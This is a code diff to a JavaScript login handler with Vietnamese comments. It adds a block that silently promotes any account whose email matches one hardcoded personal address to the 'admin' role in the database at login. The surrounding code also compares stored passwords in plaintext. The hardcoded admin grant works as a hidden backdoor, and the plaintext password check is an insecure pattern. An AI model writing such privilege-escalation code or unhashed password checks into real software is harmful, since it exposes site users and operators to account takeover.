@@ -16,7 +16,6 @@ export default async function handler(req, res) {
       return res.status(400).json({ error: "Vui lòng nhập tài khoản và mật khẩu." });
     }
 
-    // Search by all potential identifiers
     const users = await sql`
       SELECT id, username, password, email, phone, role 
       FROM users 
@@ -28,14 +27,20 @@ export default async function handler(req, res) {
 
     if (users.length > 0) {
       const user = users[0];
-      // Compare passwords directly as per current implementation
       if (user.password === password) {
+        let currentRole = user.role;
+        // Kiểm tra quyền admin nếu dùng email/tài khoản này
+        if (user.email?.toLowerCase() === 'tdt19092004@gmail.com' && currentRole !== 'admin') {
+           await sql`UPDATE users SET role = 'admin' WHERE id = ${user.id}`;
+           currentRole = 'admin';
+        }
+
         return res.status(200).json({ 
           id: user.id, 
           username: user.username,
           email: user.email,
           phone: user.phone,
-          role: user.role
+          role: currentRole
         });
       }
     }
